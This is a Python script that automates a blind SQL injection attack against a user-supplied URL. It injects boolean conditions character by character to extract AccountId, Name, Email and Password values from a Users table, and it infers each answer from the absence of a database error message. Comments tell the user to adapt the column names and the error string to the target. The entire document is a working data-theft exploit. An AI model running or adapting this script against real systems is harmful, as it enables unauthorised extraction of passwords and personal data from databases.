# Import libs
import requests
import string
import time

# Dictionary creation: all lowercase chars + all digits + @ (to scan for email addresses)
dictionary=string.ascii_lowercase+string.digits+' '+'@'+'.'
dump=""
base_URL=input("\nEnter target URL: ") # <-- example: http://localhost:5000/news.php?id=1
print("\nExecuting blind SQLi attack...\n")

start=time.time()

for column in ['AccountId','Name','Email','Password']: # <-- CHANGE THIS according to db column names
    dump+='\n\t%s: '%column
    for row in range (1,7):
        dump+='\n\t '
        for index in range (1,33):
            for char in dictionary:
                sql_query="' AND '1'=(SELECT IF((ASCII(SUBSTRING((SELECT {} FROM Users LIMIT {},1)\
                ,{},1))=ASCII('{}')),'1','0')) AND '1'='1".format(column,row,index,char)
                final_URL=base_URL+sql_query
                result=requests.get(final_URL)
                if (result.text.find("Database query failed")==-1): # <-- CHANGE THIS according to error message reported
                    dump+=char
    dump+='\n '

end=time.time()
print(dump)
print("\nProcess finished in: {:.2f} seconds".format(end-start))
